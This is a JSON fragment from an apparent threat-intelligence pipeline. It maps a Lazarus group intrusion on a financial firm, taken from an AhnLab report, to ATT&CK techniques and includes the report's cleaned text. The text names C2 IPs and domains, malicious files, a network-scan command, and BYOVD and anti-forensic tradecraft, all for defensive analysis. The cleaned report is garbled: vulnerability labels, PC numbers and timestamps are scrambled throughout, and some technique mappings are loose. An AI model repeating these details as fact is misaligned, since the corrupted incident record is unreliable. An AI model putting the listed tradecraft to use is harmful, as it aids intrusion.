            "technique_name": "Exploitation of Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Lazarus attack group exploited a public certificate software vulnerability widely used by public institutions and universities",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "asec.ahnlab.com/ko/48416"
            ],
            "tools": [
              "at",
              "PING",
              "Malware",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "03715787-5dbd-4bc4-8341-26af0cf2827a",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "Use the same file name as the system file name to masquerade as a legitimate file",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system file name masquerading"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "54e1c24e-583b-4153-ae73-2cf486f118cc",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1203",
            "tactic": "Execution",
            "description": "Exploitation of certificate software vulnerabilities",
            "confidence_score": 0.657,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "certificate software vulnerability",
              "AppCrash",
              "svchost.exe",
              "ftp.exe"
            ],
            "tools": [
              "at",
              "PING",
              "ftp.exe",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7abee364-2169-4717-9802-46c6e6fff48d",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070",
            "tactic": "Defense Evasion",
            "description": "Deletion of Prefetch files and crash dump files",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Prefetch files",
              "crash dump files"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2254ec56-c151-4b9f-93a2-3d05a0a883e7",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070.004",
            "tactic": "Defense Evasion",
            "description": "Deletion of malicious files",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.74,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "sfbappsdk.dll",
              "fswss.exe",
              "fmSysN.exe",
              "skypeserver.exe",
              "perlcritic.exe",
              "perlcritic64.exe"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2c70d694-24a1-4320-bcb0-35c244a82a51",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation of Remote Services",
            "attack_id": "T1210",
            "tactic": "Lateral Movement",
            "description": "Exploitation of certificate software vulnerabilities for lateral movement",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "certificate software vulnerability",
              "svchost.exe"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "72fcc7d8-f1e2-4a3c-abbb-da16bb805a7f",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Web Service Exploitation",
            "attack_id": "T1102",
            "tactic": "Command and Control",
            "description": "Use of legitimate domains as C2 servers",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 server domains",
              "legitimate domains"
            ],
            "tools": [
              "skypeserver.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "df310818-5acd-4f4a-b2ed-7e3176e3cc30",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "File Deletion",
            "attack_id": "T1070.004",
            "tactic": "Defense Evasion",
            "description": "Delete execution artifacts and change the file name randomly",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "file deletion",
              "random file name change"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db098f08-2e54-4504-a9b1-61ef5fc49e1e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Software Deployment Tools",
            "attack_id": "T1072",
            "tactic": "Execution",
            "description": "Loader and malware deployment",
            "confidence_score": 0.648,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "conti",
              "loader",
              "malware"
            ],
            "tools": [
              "conti",
              "loader",
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c14cc87a-0e9c-4117-899c-237a69690dff",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071.001",
            "tactic": "Command and Control",
            "description": "Use of web protocols for C2 communication",
            "confidence_score": 0.648,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 server communication",
              "web protocols"
            ],
            "tools": [
              "skypeserver.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3158034a-e54f-4c31-9192-1009adb5fc4e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "Use of Windows Command Shell to run perlcritic.exe",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "perlcritic.exe"
            ],
            "tools": [
              "cmd.exe",
              "at",
              "PING",
              "reg",
              "sc",
              "perlcritic.exe",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "08e0901d-1678-4832-87c5-e87bf752be2b",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Privilege Escalation",
            "attack_id": "T1068",
            "tactic": "Privilege Escalation",
            "description": "Use of PROCEXP152.sys for privilege escalation",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PROCEXP152.sys"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "PROCEXP152.sys",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ef85d929-a23e-4af8-9178-49bcc3fb20ab",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Use of fswss.exe for network discovery",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "fswss.exe"
            ],
            "tools": [
              "at",
              "fswss.exe",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "78ae8d8f-d6bf-45ed-9ef8-5e2029f42f8a",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c1cf319b-81d0-48ef-880b-24e9182dfc9e",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Impair Defenses",
            "attack_id": "T1562.001",
            "tactic": "Defense Evasion",
            "description": "Disable or modify V3 security product",
            "confidence_score": 0.639,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "V3",
              "Exploit/Win.Lazardoor.GEN"
            ],
            "tools": [
              "at",
              "PING",
              "Exploit/Win.Lazardoor.GEN",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8251a868-8fec-42aa-b982-1e18faf372db",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a1d5ec56-6075-419f-b718-941821f4aec6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "07f9fd66-bfae-49d8-99b2-f3243e4c322c",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f1300286-6f95-4d57-b1f1-9aab54deb180",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "C2 communication",
            "confidence_score": 0.629,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.046,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 communication"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "57596d7a-fb07-4d3b-9303-590d25be1293",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5e3c8a86-ac12-406e-9a84-46dae5bdc1ec",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "33c41cff-e13a-44cb-9f46-06701b92c1f6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3872124e-d3fb-4d89-89b8-7c4b559776f9",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Indicator Removal",
            "attack_id": "T1070.006",
            "tactic": "Defense Evasion",
            "description": "Timestomping of malicious files",
            "confidence_score": 0.626,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious file timestamps"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "svchost.exe",
              "ftp",
              "net",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "57e1d081-21d2-48c3-af23-ef5c60ec12ee",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Services activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 6 nuno Feb 2023  2 Lazarus attack group attack case using public certificate softwarevulnerability widely used by public institutions and universities asec.ahnlab.com/ko/48416 Since last year (March 2021)  the Lazarus attack group s malware has been found in a number of domestic companies such as defense  satellite  software  and media companies  and the AhnLab Security Emergency Response Center (ASEC) has been continuously tracking and analyzing the activities of the Lazarus attack group and related malware. The affected customer in this case had already been breached once by the Lazarus attack group in May 2022  and the breach recurred due to a 5-day vulnerability in the same software. At the time of the May 0 breach  the customer was using a weak version of the certificate-related program widely used in public institutions and universities  and all the software was updated to the latest version after the accident. This time  however  it was breached by a 2022-day vulnerability in the software. ASEC has reported the software to KISA  but the vulnerability has not been clearly identified  and the manufacturer and software are not disclosed in this article because no software patch has been released yet. In addition to this incident  the Lazarus Group is continuously researching various software vulnerabilities to infiltrate domestic institutions and companies  and is continuously changing TTP by disabling security products  and using anti- forensic technologies to hinder and delay detection and analysis. This report is based on the victim s forensic analysis report. The report was prepared in January  but after delaying disclosure due to software vulnerability patching issues  the company decided to release the software information after anonymizing it. When a software patch is released  we will redistribute a report of the version that released the information. Outline of the incident CATEGORY DESCRIPTION Duration ofthe incident2022/10/21   2022/11/18 CustomerType Financial Business DamageSystemType Windows 10 DamageStatus Backdoor malware infection and C2 communication Types ofattacks Lateral movement using 0-Day vulnerability of company A s certificate program   Since the patch has not yet been released  vulnerable software information is notdisclosedDisabling vaccines through BYOVD attacksAnti-forensicsTimestamp operationChange the file name randomly and delete itDelete execution artifactsUse the same file name as the system file name assailantLazarus 2 / 1 6 IncidentTAG  Lazarus  skypeserver.exe  0-day   \ub8e8\ud2b8\ud0b7  BYOVD [table] analysis summary [Figure] Infringement Flow Chart Lessons from examples The attackers took advantage of a 0-Day vulnerability in the public certificate software widely used in the country. This type of software does not update automatically  so be sure to patch the latest version of your software and uninstall it if you are not using it. The attackers defeated the security product using a technique called BYOVD  which exploits a vulnerable driver kernel module. The attackers performed anti-forensic acts  such as changing and deleting files to conceal malicious behavior  or manipulating time information. The victim was re-breached by the same attacker in a similar way. In addition to reactive measures  continuous monitoring must prevent the threat from recurring. Case Details 3 / 1 6 Summary of analysis results After analyzing the two PCs received from the customer  it was confirmed that PC01 and PC02 were subjected to lateral movement attacks using vulnerabilities in the certificate software. PC02 was attacked from an unidentified internal system on October 10  and PC21 was attacked by PC01 on November 11. Given that PC18 and PC02 had the latest version of certificate software installed  it is believed that the attacker used a 01-Day vulnerability. In addition  PC02 and PC0 experienced V01 incapacitation on November 02  but a different method was used. The system analyzed this time was subjected to a lateral movement attack and was not related to the initial influx of attackers. It is believed that the victim s Internet network was threatened by the Lazarus attack group  which successfully broke in in May. SYSTEMDATE DESCRIPTION PC01 2022/11/18Lateral movement attack due to certificate softwarevulnerability ( PC02   PC01 ) 2022/11/18V3 Disabling Occurs PC02 2022/10/21Lateral movement attack due to certificate softwarevulnerability ( unknown internalsystem   PC02 ) 2022/11/18V3 Disabling Occurs [Table] Major malicious actions by each system PC01 Analysis PC01 is believed to have been compromised by a 2022-Day vulnerability attack in certificate software on 11/18/10 00:35:0. Three network connection attempts were made from PC02 to the service TCP port of PC01 s certificate software. In the previous two connections  there was no special response from PC01  but when PC02 accessed PC11 at 18:10 on 00/01 using skypeserver.exe (unsecured) created using svchost.exe  PC01 encountered an error (AppCrash) in the certificate software  and malicious actions began thereafter. When AppCrash occurred  all error reports (WARs) and memory dump files stored in the system were deleted and could not be checked. It appears to have been intentionally deleted by the attackers. DATETIME DESCRIPTION REMARKS 2022/11/1516:18:52svchost.exe networkconnection10.20.XXX.125:XXXXX Presumedto be anattackfailure orconnectiontest 2022/11/189:49:31 svchost.exe networkconnection10.20.XXX.125:XXXXX Presumedto be anattackfailure orconnectiontest 2022/11/1810:00:27network connection .exeskypeserver10.20.XXX.125:XXXXX Successfulexploits [Table] History of access from PC02 to certificate software service port of PC01 (V3 behavior log) 4 / 1 6 [Figure] Record of Crashdump File Generation in Certificate Software Among the traces identified in PC01  the difference from the attack that occurred in May is that the process used after the vulnerability attack in the certificate software was svchost.exe rather than ftp .exe  and the vulnerable version of the software was installed at the time  but this time all the latest versions were installed  so there is no known vulnerability information. TARGETINSTALLDATE SOFTWAREVERSIONCOMPROMISEDDATE PC01 2022/07/01Up-to-date2022/11/18 PC02 2022/08/30Up-to-date2022/10/21 [table] Certificate software versions installed on PC01 and PC02 After accessing PC01  the attacker injected a malicious thread into a normal process (svchost.exe) and used it for C2 communication and backdoor. It then neutralized the V3 product installed on the system  and created and executed additional malicious files. In addition  in this analysis  traces of manipulation of the timestamp of malicious files were confirmed  and anti-forensic behaviors such as randomly changing and deleting file names when deleting files were found  so it seems that attackers are actively interfering with the analysis. TIMELINE (PC01) The timeline of the infringement identified in PC01 is as follows: TIME (22/11/18)CATEGORY BEHAVIORS 10:00:37injection svchost.exe injects a malicious thread into a running process to start malicious activity 5 / 1 6 10:00:37C2communicationsvchost.exe connects to the attacker s C2 address 121.78.246.155(dalbinews.co.kr) 10:10:01Malicious filecreation Malicious file creation C:\\ProgramData\\tszui.tmp (unsecured) 10:17:55Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\tszui.tmp -  Delete phqghumeaFile :C:\\ProgramData\\phqghumea (unsecured) 10:18:47C2communicationsvchost.exe connects to the attacker C2 address 121.78.158.46 (www.studyholic.com) 10:20:28Neutralizesecurityproducts V3 detects security product incapacitation (Exploit/Win.Lazardoor.GEN) 10:20:24C2communicationNetwork connection to attacker C2 183.110.224.172 (ctmnews.kr) 10:27:58Malicious filecreation Malicious file creation C:\\ProgramData\\perlcritic.exe (unsecured) 10:28:53Generatevulnerabledriver files Malicious file execution C:\\ProgramData\\perlcritic.exe (unsecured)Driver file creation (not malicious)C\\Windows\\System32\\drivers\\PROCEXP152.SYS (secured) 10:29:16Malicious filecreation Malicious file creation C:\\ProgramData\\tds.tmp (unsecured) 10:29:36Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\tds.tmp -  mxnsbqyDelete files:C:\\ProgramData\\mxnsbqy (unsecured) 10:41:33Anti-forensicsDelete AppCrash File Delete File :C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_XXXXXXXXXXXX.exe _9474ee13fbc7651aabaf2f3c9b1fedc9e7489e51_bc343f60_ddd4e0eb-714c-4cf4-ae23-43cd18c59603 (unsecured) 10:42:19Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\perlcritic.exe -  kxlmatmoynktxlDelete files:C:\\ProgramData\\kxlmatmoynktxl (unsecured) 10:44:31Malicious filecreation Create (secure) backdoor loader (LegacyUserManager.dll) Loading target file:C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat (secured) C: \\ProgramData\\Microsoft\\Settings\\Settings.vwx (secured) 10:44:47Anti-forensicsTimestamp (Standard Information) operation of the backdoor loader(LegacyUserManager.dll) (Secure) 10:45:47Malicious filecreation Creation (Secured) of backdoor program (Keys.dat) Creation of malware with C2 access and file download function 10:45:56Anti-forensicsTimestamp (Standard Information) manipulation (Secured) of backdoor program (Keys.dat) 10:46:12Malicious filecreation Creation of backdoor program (Settings.vwx) (secured) Creation of malware with C2 access and file download function 10:46:30Anti-forensicsTimestamp (Standard Information) manipulation (Secured) of backdoor program (Keys.dat) [table] Malicious behavior of attackers found on PC01 6 / 1 6 PC02 Analysis The attacker was found to have accessed PC10 by exploiting a vulnerability in the certificate software on 21/10 48:48:02. AppCrash occurred during the attack of the vulnerability  after which the ftp .exe was executed and malicious behavior began. This is the same method that occurred in the affected customer in May. The IP of the system that accessed PC5 has not been determined. [Picture] Certificate Software Error Log Verified on PC02 (Application.evtx) [Picture] Certificate software found in V02 MDP log on PC3 and malicious thread injection code in ftp .exe After first infiltrating PC10 on 21/02  the attacker created a malicious file that performed C2 server communication and backdoor functions through an injected ftp .exe. On 10/27  unlike the attack on the 21st  instead of ftp.exe  it injected a malicious thread into the SVChost.exe process  after which it carried out malicious actions with control until 11/18. On 11/15  it was confirmed that an FSWss file .exe was created to scan the internal network. After that  it was confirmed that he used svchost.exe to connect to the service port of PC01 s certificate software twice. On 11/18  a skypeserver.exe file was created and the file was used to access PC01 s TCP XXXXX  and at this time  an AppCrash of the certificate software occurred on PC01  and then PC02 confirmed traces of disabling antivirus  creating and executing malicious files  etc.  the same as PC01. TIMELINE (PC02) The timeline of the infringement identified in PC02 is as follows: DATE TIME CATEGORY BEHAVIORS 22/10/2110:48:50C2 communicationftp.exe connects the attacker to the C2 addressand the network 111.92.189.48 (www.scope.co.kr) 10:48:51 ftp.exe connects the attacker C2 address andnetwork 183.110.224.172 (ctmnews.kr) 7 / 1 6 10:49:46 ftp.exe connects the attacker C2 address to thenetwork 115.68.52.47 (www.artinsight.co.kr) 10:51:35 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 10:52:31 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 10:59:33 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 12:52:38 ftp.exe connects the attacker to C2 address andnetwork 119.207.79.175 (lightingmart.co.kr) 14:21:58Malicious file creationftp.exe create file C:\\Windows\\System32\\lecacyusermanager.dll(secured) 14:59:07 ftp.exe file created C:\\Windows\\System32\\wptsextensions.dll(secured) 15:34:47Anti-forensics Rename a malicious file Rename:C:\\Windows\\System32\\legacyusermanager.dll - C:\\Windows\\temp\\lum.tmp (secured) 22/10/2715:25:00injection Injecting malicious threads into normal processes(svchost.exe) 15:26:05C2 communicationsvchost.exe connects the attacker with C2address 115.68.52.47 15:27:53Malicious file creationsvchost.exe created malicious fileC:\\Windows\\System32\\wptsextensions.dll(secured) 22/11/15 11:32:36Create a file svchost.exe created malicious file C:\\ProgramData\\fswss.exe(unsecured) 11:32:48File executionNetwork scanning with fswss.exe C:\\ProgramData\\fswss.exe /scan/UseIPAddressesRange 1 /IPAddressFrom10.20.XXX.1 /IPAddressTo 10.20.XXX.255 /stextC:\\ProgramData\\fswss.log 11:33:41Anti-forensics Rename malicious files Rename: C:\\ProgramData\\fswss.exe -  xeudsgpfo(unsecured) 12:50:13Malicious file creationsvchost.exe creates file C:\\ProgramData\\fmsysn.exe (not secured) 12:51:04Execution ofmalicious filessvchost.exe runs other processes C:\\ProgramData\\fmSysN.exe10.20.XXX.1 10.20.XXX.36 XXXXX 10c:\\programdata\\fmSysN.log 8 / 1 6 13:06:49Anti-forensics Rename malicious files: C:\\ProgramData\\fmsysn.exe - 